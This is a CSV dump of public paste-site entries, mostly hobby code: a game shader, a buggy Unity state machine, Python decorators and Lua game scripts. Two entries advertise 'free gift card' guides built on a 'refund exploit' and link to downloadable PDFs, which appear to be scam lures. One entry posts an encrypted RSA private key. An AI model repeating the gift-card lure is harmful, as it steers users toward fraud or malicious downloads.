id,title,username,language,date,content
ZxRJz4nQ,crazy gloom2 light style,illwieckz,C,Saturday 13th of April 2024 12:59:34 PM CDT,"gloom2beta2/71955335FA395BA4338DCE6901B1005B
{ // Q3Map2 defaulted
	{
		map $lightmap
		rgbGen identity
	}
	
	// Q3Map2 custom lightstyle stage(s)
	{
		map maps/gloom2beta2/lm_0013.tga
		blendFunc GL_SRC_ALPHA GL_ONE
		rgbGen wave noise 1 .75 1.6 4.2 // style 2
		tcGen lightmap
	}
	{
		map $lightmap
		blendFunc GL_SRC_ALPHA GL_ONE
		rgbGen wave noise 1 .5 3.7 4.9 // style 3
		tcGen lightmap
		tcMod transform 1 0 0 1 0.50000 0.00000
	}
	{
		map maps/gloom2beta2/lm_0013.tga
		blendFunc GL_SRC_ALPHA GL_ONE
		rgbGen wave noise 1 1 2.6 1.3 // style 4
		tcGen lightmap
		tcMod transform 1 0 0 1 0.50000 0.00000
	}

	{
		map textures/gloom2/es_dark-mtl_l1_vd1a.tga
		blendFunc GL_DST_COLOR GL_ZERO
		rgbGen identity
	}
}"
XLfKCaGn,monsterLoveExample,MarcoFalciglia,C#,Saturday 13th of April 2024 12:51:32 PM CDT,"using System.Collections;
using System.Collections.Generic;
using MonsterLove.StateMachine;
using UnityEngine;

public enum StatesPrepareTea
{
    Initialization,
    FullfillTeaPotWithWater,
    PutTeaBagInside,
    PutTeaPotOnStove,
    Completed
}

public class PrepareTea : MonoBehaviour
{
    public GameObject teapot;
    public StateMachine<StatesPrepareTea> _stateMachine;
    public StatesPrepareTea initialStateDebug;

    
    //Singleton
    private static PrepareTea _instance;
    public static PrepareTea Instance => _instance;
    
    protected override void Awake()
    {
        base.Awake();
    
        _instance = this;
        _stateMachine = new StateMachine<StatesPrepareTea>( this );
        
        teapot.GetComponent<Animator>().enabled = false;
            
        _stateMachine.ChangeState(StatesPrepareTea.FullfillTeaPotWithWater);
    }

    protected override void Start()
    {
        base.Start();

        changeState(StatesOS4.FullfillTeaPotWithWater);
     
    }
    
    public void changeState(StatesPrepareTea _newState)
    {
        _stateMachine.ChangeState(_newState);
    }
    
    private void Initialization_Enter() {
        Debug.Log( ""Entro nello State di Initialization"" );
    }    
    
    private void FullfillTeaPotWithWater_Enter() {
        Debug.Log( ""Entro nello State FullfillTeaPotWithWater"" );
    }
    
    private void PutTeaBagInside_Enter() {
        Debug.Log( ""Entro nello State PutTeaBagInside"" );
    }
    
    private void PutTeaPotOnStove_Enter() {
        Debug.Log( ""Entro nello State PutTeaPotOnStove,"" );
    }    
    
    private void Completed_Enter() {
        Debug.Log( ""Entro nello Stato Finale"" );
    }

	private void ManageFlow()
	{
		Action transition = null;

		if (nextState == StatesPrepareTea.PutTeaPotOnStove) // se il te è pronto
		{
			if (/* condizione che mi interessa*/) { 
				transition = () =>
				{
					_stateMachine.ChangeState( nextState ); // vado verso la conclusione
				};
			} else {
				transition = () =>
				{
					// funzione per gestire il cambio di stato dove mi interessa. Magari ricomincio da capo
					_stateMachine.ChangeState( StatesPrepareTea.Initialization );
				};
			}
		}
		else // magari sono in una fase precedente...
 		{
		}
	}

}

----
// IN UN'ALTRA CLASSE, POTRESTE GESTIRE CON UN RIFERIMENTO STATICO GLI STATI INTERNI ALLA FINITE STATE MACHINE

public class ManageStates
{
 	private AudioSource _audioSource;

	public AudioClip comment_FullfillTeaPotWithWater;
    public AudioClip comment_PutTeaBagInside;
    public AudioClip comment_PutTeaPotOnStove;


private void performAudioCommentBasedOnPhase()
    {
        switch (PrepareTea.Instance._stateMachine.State)
        {
            case StatesPrepareTea.FullfillTeaPotWithWater:
                _audioSource.PlayOneShot(comment_FullfillTeaPotWithWater);
                break;
            case StatesPrepareTea.PutTeaBagInsidee:
                _audioSource.PlayOneShot(comment_PutTeaBagInside);
                break;
            case StatesPrepareTea.PutTeaPotOnStove:
                _audioSource.PlayOneShot(comment_PutTeaPotOnStove);
                break;
     
        }

    }
}
"
0a1VTavc,Untitled,youske,Python,Saturday 13th of April 2024 12:51:30 PM CDT,# EC2instance 起動スクリプト
XuHfJpX9,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Saturday 13th of April 2024 12:43:10 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_482456.pdf

Working as of:
13 April 2024"
7jRwmjxF,Untitled,Stoikiti,Lua,Saturday 13th of April 2024 12:19:16 PM CDT,"function widget:GetInfo()
    return {
      name = ""repeat repeat orders"",
      desc = ""a way to keep track of multiple sets of repeat orders and cycling through them"",
      author = ""zombean"",
      date = ""2024"",
      license = ""GNU GPL, v2 or later"",
      layer = 0,
      enabled = true
    }
end

local repeat_orders = {}
local mode_activated = false
local activate_mode_key = 420
local go_to_next_repeat_key = 421

function widget:KeyPress(keyCode, mods, label, utf32char, scanCode, actionList)
  if #actionList then return end -- do nothing if engine has actions for these key pressed
end

function widget:KeyRelease(keyCode, mods, label, utf32char, scanCode, actionList)
  if #actionList then return end -- do nothing if engine has actions for these key pressed
end

function widget:UnitCommand(unitID, unitDefID, unitTeam, cmdID, cmdParams, options, cmdTag)
  --if not on repeat orders return
end

function widget:UnitDestroyed(unitID)
  if repeat_orders[unitID] then
    repeat_orders[unitID] = {}
  end
end

function widget:UnitTaken(unitIT)
  if repeat_orders[unitID] then
    repeat_orders[unitID] = {}
  end
end

function widget:UnitGiven(unitIT)
  if repeat_orders[unitID] then
    repeat_orders[unitID] = {}
  end
end

local millis_start_timer = Spring.GetTimer()
local function millis()
  return math.ceil(Spring.DiffTimers(Spring.GetTimer(), millis_start_timer) * 1000)
end

local next_call = 0

function widget:Update()
  local now_time = millis()
  if next_call > now_time then return end
  next_call = now_time + 1000
  Spring.Echo(os.date(""%H:%M:%S:%MS""), mode_activated)
end"
JFSey4ik,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Saturday 13th of April 2024 12:14:38 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
13 April 2024"
NrZ1bwqX,True QEMU Guest Agent ping,Infra_HDC,Bash,Saturday 13th of April 2024 11:37:16 AM CDT,"user@host:~$ virsh --connect=qemu:///system qemu-agent-command virthost-0001 '{""execute"":""guest-ping""}'
{""return"":{}}
"
EBymbgP7,Untitled,MisterQuirk,Python,Saturday 13th of April 2024 11:00:08 AM CDT,"#Task 1
import time
def timer(func):
    def inside_func(*args, **kwargs):
        st = time.time()
        func(*args)
        fin = time.time()
        print(f'Function worked for {fin - st} seconds')

    return inside_func


#Task 2

def cache(f):
    D = dict()
    def inside_f(*args):
        if args not in D:
            D[args] = f(*args)
        return D[args]
    return inside_f

#Task 3

def logging(f):
    def inside(*args):
        result = f(*args)
        with open('log.txt', 'a+') as file:
            print(f'The function has been called {f.__name__}, the result of its work is - {result}', file=file)
            return result

    return inside

#Task 4

def retry(sec, times):
    def decor(f):
        def inside(*args):
            for i in range(times):
                if f(*args) is not None:
                    return f(*args)
                time.sleep(sec)
            return None
        return inside
    return decor

"
Gk2iqPeA,Untitled,zikoman,HTML,Saturday 13th of April 2024 10:30:19 AM CDT,"----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,CC229417351882A9C41807DB15DA8F63

5o7QxXZ+AuoEmz6nHOtBAKW1zjQJ+yxO+0UYn6YzvOGjKVLuBlhXl/+Id1h2zl5U
PdJRGs0k7PEvNbqMwmerDY0xaSR8GAk8bSrwdD0WGOoM2XT2vk5bZApylhJlhWQa
t7ZOSVY3e4OkhNWg4XFo/EK8qlU14RQxDU/e2FsKvdT3iC+mzTmprDrJdPG5SupJ
mzQZyzv+TUoukFK3Ec64aoVsnGicsCBM3Yj7LfqLONQtUth4feASRH3i7wH2mMJk
/JLnPzo/kx/QOcU8f73wfrmv5a6LDxIfaLD85x/xBxfpBebPzR6tbQcTes8eoDIE
KKlCyiyctZ3z1ra67gk2N9QU2HaHccxNlUxZstO0F1NO2rpCwsEoISCGlkVJAX2u
9/hqCX5DwpgeymmgksIWQ5WliVpXThYnDhhCGQPaLkpiffmxordNNCPS4Ip0g46x
z6r9MWsiuzOutsJMMsBe6sQZpAs9VwIxufVwh1xOYKHb8m25CyPswbGiuDXWDUQr
inb8tGmks26PJRw/uijut/LosQ1HW3oV7+ErgCJ1OzS2fN766vLQDKwhQSVR9DYU
GwkjpkDCz7U7nlxXgs2doI38hPeVFH511HJbGjRv2tturqlW9+1UJ7g+u+hRv3GP
O0Bjd0AkHJGrvYguGOB2PwzoGP3HiZMYlR3R6sCC6ds2bXJSXlwDucEVu8xrWdIT
Ri0h11osob4fKJtagovOTf3i9Ca7FgrgI6mukFH45u5BZeQRvHgyOlGv+JbAX9TM
meofo+eRHBded4X6xWDsokf/yZTFRf+wS6eMqT35hI471P808tW7ZnlBeq76n/+P
xFVyCdnDuilLcngbzIA6gFkGrlebaP8P/GFrPFIPhfDRcG57CSMekWsbQ2/gApfx
BFqH0calKvlYgMccqzxyB0F78QQ6rO6+LGiLUWuXJmAc9z+duWFT1mlfINY7pMop
RakoWm6WGruiSQooadteGrQE2XDcVvjo06eMnA2A16W1p1HXlr2i2nLNj7G4KC3L
7cVCqkZPfE4cF816HU7oMUh6i53SfJAT/Km54Riadvd2zFk4rNLkwmXiAMDBa4BP
ndplVGEGqxYkTLNLTHUgbbIa8oOKw0WPLOtDSIoI6emhHBp2ei/xnsNfuNQcS3X1
GJMYVxpqBKwhQpsuXqc4sJZdn7+q0TlNkMsSXhCqUTw6we1W5sHPvnRZMNWvZdbP
c/BNa4Zpl5TNLcuO/1CioP4D3Li8cToysZIpx827zXU1lHCIznDD0gcanf3qV97Y
+RODn1a6OcvlxToIJcJZCShTM5EM0MIU2Sx3wVZ7MGm7d2WMMyridrPTqIRGfprC
R7umjQeucFqVxudEqiuNBreLV0MlDok8ogcUVNtgIl9KceC+8iQG64Z4YreoHluG
69MbeGj3Mdtk50wpRQQyond1whFJrSjoJaemdWaFdFBzg/7mqcN0GHjolBiV+F3d
qNynvPkOhvXuwNAVyhXdmeQfFCcuUyC3vXjMohvjOXAZ4w/yc0BqqvEQD2N4lAtf
ZTmoOGrktnAoZcJDTvRnos2zqNw5LU2WNyclbZm5cPDaJkAh5swGYSADDu5QYeuB
-----END RSA PRIVATE KEY-----"
QXkrar3a,Power_control,kk258966,Lua,Saturday 13th of April 2024 10:19:59 AM CDT,"-- Default settings, do not change
local options = {
  -- Unique identifier for this matrix on rednet, required for rednet functionality
  rednet_identifier = '',
 
  -- Energy type being displayed (J, FE)
  energy_type = 'FE',
 
  -- Update frequency, in seconds
  update_frequency = 1,
 
  -- Text scale on the monitor
  text_scale = 1,
 
  -- Output debug data to the computer's internal display
  debug = true,
}

--------------------------------------------------
--- Internal variables, DO NOT CHANGE
--------------------------------------------------
 
--- This will be used as the installer source (Pastebin)
local INSTALLER_ID = 'LMdUZY4Z'
 
--- Supported energy suffixes
local energy_suffixes = { 'k', 'M', 'G', 'T', 'P' }
 
--- Supported time periods when converting seconds
local time_periods = {
  { 'weeks', 604800 },
  { 'days', 86400 },
  { 'hours', 3600 },
  { 'minutes', 60 },
  { 'seconds', 1 },
}
 
--- This is our Induction Matrix, we'll auto-detect it later
local cube = nil
 
--- This is our Monitor, we'll auto-detect it later
local monitor = nil
 
--------------------------------------------------
--- Helper functions
--------------------------------------------------

--- Holds the current buffer of data being printed
local machine_term = term.current()
local print_buffer = {}
 
--- Writes data to the output monitor buffer
function print_r (text)
  table.insert(print_buffer, text)
end
 
--- Writes formatted data to the output monitor buffer
function print_f (format, ...)
  print_r(string.format(format, ...))
end
 
--- Writes the buffer into the output monitor
function print_flush ()
  if monitor then
    -- Redirects writes to monitor (if any)
    if monitor then
      term.redirect(monitor)
    end
 
    -- Clears terminal
    term.clear()
    term.setCursorPos(1, 1)
 
    -- Writes new data
    print(table.concat(print_buffer or {}, '\n'))
 
    -- Redirects writes back to computer (if using monitor)
    if monitor then
      term.redirect(machine_term)
    end
  end
 
  -- Clears buffer
  print_buffer = {}
end
 
--- Writes debug info to the machine
function debug (...)
  if options.debug then
    print(...)
  end
end

--- Rounds a number with N decimals
function round_decimal (number, decimals)
  local multiplier = math.pow(10, decimals or 0)
  return math.floor(number * multiplier) / multiplier
end
 
--- Rounds a percentage (0..1) to a number of decimals
function round_percentage (number, decimals)
  return ('%s%%'):format(round_decimal(100 * number, decimals or 1))
end

function print_cube_info (cube_info)
  print_r('Energy Production Control')
  print_r('------------------')
  print_r('')
  print_f('Power : %s', energy_string(cube_info.energy_stored))
  print_f('Limit : %s', energy_string(cube_info.energy_capacity))
  print_f('Charge: %s', round_percentage(cube_info.energy_percentage))
  print_r('')
  print_f('Input : %s/t', energy_string(cube_info.io_input))
  print_f('Output: %s/t', energy_string(cube_info.io_output))
  print_f('Max IO: %s/t', energy_string(cube_info.io_capacity))
  print_f('Stat: %s/t', cube_info.gen_stats)
  print_r('')
  

end
-- Detects peripherals
monitor = peripheral.find('monitor')

if monitor then
  debug('Monitor detected, enabling output!')
  monitor.setTextScale(options.text_scale)
else
  debug('No monitor detected, entering headless mode!')
 
 
end





--------------------------------------------------
--- Main runtime
--------------------------------------------------
 
debug('Entering main loop...')
--- This will be updated after every energy collection, it is used to calculate how much power is actually being added/removed from the system
local energy_stored_previous = nil

while true do
  local status, err = pcall(function () 
    -- Attempts to auto-detect missing Cube
    if not Cube then
      Cube = peripheral.find('mekanism:ultimate_energy_cube')
 
      -- Checks if it worked
      if not Cube then
        error('Cube not connected!')
      end
    end
	
	 --- Save status
    local charge_status = 1
  
    --- This is our main information
    local cube_info = {
      energy_stored = cube.getEnergy(),
      energy_capacity = cube.getMaxEnergy(),
      energy_percentage = cube.getEnergyFilledPercentage(),
      io_input = cube.getLastInput(),
      io_output = cube.getLastOutput(),
      io_capacity = cube.getTransferCap(),
	  gen_stats = gen_stats_input
    }
	
     if charge_status == 1 then
		if energy_capacity < 50 then
			redstone.setOutput(""right"", false)
			gen_stats_input = ""Charging ...""
			charge_status = 2
			end
		else
			if energy_capacity > 90 then
			redstone.setOutput(""right"", true)
			gen_stats_input = ""Idle""
			charge_status = 1
			end
		end
		
		
 
     if not energy_stored_previous then
      energy_stored_previous = cube_info.energy_stored
    end
	
	-- Calculates power changes and adds them to our information
    cube_info.change_interval = options.update_frequency
    cube_info.change_amount = cube_info.energy_stored - energy_stored_previous
    cube_info.change_amount_per_second = cube_info.change_amount / options.update_frequency
	
	
    -- General stats
    cube_info.is_charging = cube_info.change_amount > 0
    cube_info.is_discharging = cube_info.change_amount < 0
 
    -- Sets the new ""previous"" value
    energy_stored_previous = cube_info.energy_stored
 
     
   -- Prints the matrix information
    print_cube_infoinfo(cube_info)
  end)
 
  -- Checks for errors (might be disconnected)
  if not status then
    -- Clears buffer first
    print_buffer = {}
 
    -- Shows error message
    print_r('Error reading data')
    print_r('Check connections.')
    print_r('------------------')
    print_r(err)
  end
 
  -- Outputs text to screen
  print_flush()
 
  -- Waits for next cycle
  os.sleep(options.update_frequency)
end"
